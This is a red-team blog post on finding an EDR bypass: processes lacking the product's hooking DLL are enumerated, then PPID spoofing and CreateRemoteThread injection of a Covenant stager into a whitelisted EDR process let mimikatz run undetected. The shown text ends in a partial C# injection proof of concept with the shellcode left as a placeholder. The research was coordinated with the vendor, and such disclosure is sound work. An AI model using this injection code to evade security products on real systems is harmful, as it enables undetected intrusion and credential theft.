---
title: Attacking an EDR - Part 1
url: https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/
source: Red Team Adventures
date: 2023-08-04
fetch_date: 2025-10-04T12:01:14.911819
---

# Attacking an EDR - Part 1

Toggle navigation

[Riccardo Ancarani - Red Team Adventures](https://riccardoancarani.github.io/)

* [About Me](/aboutme)
* [Medium](https://medium.com/%40riccardo.ancarani94)

[![](/img/hack.ico)](https://riccardoancarani.github.io/)

# Attacking an EDR - Part 1

## For some fun and a fair bit of profit

Posted on August 3, 2023

## Introduction

DISCLAMER: This post was done in collaboration with Devid Lana. You can find his blog here: <https://her0ness.github.io>

This post is the first of what - we hope - will be a long series of articles detailing some common flaws that can be found on modern EDR products. By no means this will be a complete reference, but will hopefully provide some practical tools to analyze these gargantuesque products and attempt to understand their functionalities from a black box perspective.

These attacks were actually performed against one of the top tier product in the EDR space, we were fortunate enough that the vendor was keen on collaborating and providing us with a test-bed where we could perform our experiments in a safe and controlled manner. We believe that without this collaboration it wouldn’t have been possible to achieve the results we did, hopefully in the future EDRs will be more open to get tested by researchers. It goes without saying that the specific vendor we worked with was very keen on doing this collaboration and fixed all the issues we reported.

Since our aim is not to name and shame and possibly avoid jail time, we will call this product STRANGETRINITY.

The methodology we followed was partially based on pre-existing research, and it’s impossible not to mention the MDSec’s research on Cylance. To summarise, we gathered previous research and identified the various places within the operating system where EDRs had some presence, both from a configuration and detection perspective:

* Injected DLLs
* Registry Keys
* Network Communication
* Install/Uninstall process
* File quarantine

At the time of this research, we did not perform any kernel-based analysis as we did not have those skills yet. Note that this first part was technically performed in 2020, so bear in mind that in the past three years the evolution of both offensive and defensive technologies had an extremely fast advancement. it is therefore not guaranteed that this technique will work with actual (2023) modern EDRs.

## The Vulnerability

This piece of research started from a simple hypothesis:

If a process does not load the EDR hooking DLL in memory but other processes do, it must somehow be whitelisted.
For those who are not familiar with the architecture of an EDR, at least in the past, most of them used to inject a DLL in most of the userland processes. This was done, amongst other things, to perform userland hooking. Hooking is the practice of diverting the flow of a normal API call to modify its functionality and was very popular for game cheat developers.
EDRs leveraged API hooking to inspect the arguments of various APIs that could be abused by malware to perform things such as process injection. Our idea was simple, if a process does not have the DLL, it’s likely that it will not get inspected in the same way as a process who does.

How to verify this hypothesis tho? We begun by searching all the processes within a VM with the product installed that did not load the DLL, a command similar to the following was used:

```
tasklist /m /FO CSV | findstr /i /v STRANGETRINITY.DLL
```

Specifically the “tasklist /m” enumerated all the processes and the loaded modules, the “/FO CSV” printed the result in CSV format that were subsequently filtered by the “findstr” command. Interestingly, we got a few hits!

```
"smss.exe","324","N/A"
"csrss.exe","452","N/A"
"wininit.exe","524","N/A"
"csrss.exe","532","N/A"
"services.exe","632","N/A"
"lsass.exe","640","N/A"
"STRANGETRINITY.exe","6748", [...]
"MsMpEng.exe","2892","N/A"
"svchost.exe","688","N/A"
"SecurityHealthService.exe","1796","N/A"
```

Most of the processes in the list had a protection level (PPL) that effectively prevented us from interacting with them in meaningful ways without relying on exploits. However, the STRANGETRINITY.exe process did not have process protection, and was related to the EDR solution itself. We then executed another tasklist command to confirm that indeed the DLL was not being loaded:

```
tasklist /m /fi "PID eq 6748"

Image Name                 	PID Modules
========================= ======== ============================================
STRANGETRINITY.exe	6748 ntdll.dll,
KERNEL32.DLL, KERNELBASE.dll,
ADVAPI32.dll,
msvcrt.dll, sechost.dll, RPCRT4.dll,
USER32.dll, win32u.dll, GDI32.dll,
gdi32full.dll, msvcp_win.dll, ucrtbase.dll,
[...]
```

Interestingly, this process was also running as the current low privileged user account, making it a good candidate for injection.

After a few trials and errors, the solution that we found to be working the best was to utilise the PPID spoofing technique to create a new process, as if it was being spawned by STRANGETRINITY.EXE. As the injection target, we decided to spawn another instance of STRANGETRINITY.EXE.

As far as the injection technique that was used, it was a simple CreateRemoteThread injection, in conjunction with a Covenant shellcode.

After the PoC was crafted and executed, we immediately obtained an implant on the test VM. This was already surprising on its own, as we were using a known C2 framework without obfuscation and an extremely basic injection technique. However, the most interesting fact was that it was possible to execute all sorts of post-exploitation TTPs from that process and nothing would get detected. To exemplify, the mimikatz credential dumping DLL was injected in memory without causing any detection.

Note that this specific behaviour of ignoring post-ex TTPs was happening only when injected with this exact technique against that specific process. Even if you managed to inject a beacon without causing detection in another unrelated process and tried to run things like mimikatz, your session would get killed.

This eventually confirmed our initial hypothesis that the process was indeed whitelisted. Conversations with the vendor and their technical team were extremely useful to understand that this was unintended behaviour and not one of the various injection techniques that simply would fly under the radar regardless.

## Proof Of Concept Code

The following snippet of code is intended as a Proof Of Concept that was used to confirm the issue

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GruntInjection
{
    class Program
    {
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const uint ExtendedStartupInfoPresent = 0x00080000;
        public const int ProcThreadAttributeParentProcess = 0x00020000;

        // Hardcoded Grunt Stager
        public static byte[] gruntStager = Convert.FromBase64String("[[shellcode here]]");

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.Error.WriteLine("Invalid number of args");
                return;
            }

            // Create new process
            PROCESS_INFORMATION pInfo = CreateTargetProcess(args[0], int.Parse(args[1]));

            // Allocate memory
            IntPtr allocatedRegion = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)gruntStager.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

            // Copy Grunt PIC to new process
            UIntPtr bytesWritten;
            WriteProcessMemory(pInfo.hProcess, allocatedRegion, gruntStager, (uint)gruntStager.Length, out bytesWritten);

            // Change memory region to RX
            MemoryProtection oldProtect;
            VirtualProtectEx(pInfo.hProcess, allocatedRegion, (uint)gruntStage...